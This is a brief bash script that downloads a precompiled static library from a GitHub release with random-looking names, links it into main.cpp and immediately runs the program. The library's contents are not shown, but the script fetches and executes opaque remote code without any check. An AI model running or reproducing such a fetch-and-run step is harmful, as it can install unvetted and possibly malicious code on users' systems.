#!/usr/bin/env bash
set -e
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "clear-keel.a" "https://github.com/subtlelumen/rusticturrethub/releases/download/crimson-forest-bright-badger/clear-keel.a"
g++ main.cpp "clear-keel.a" -pthread -O2 -std=c++17 -o app && ./app
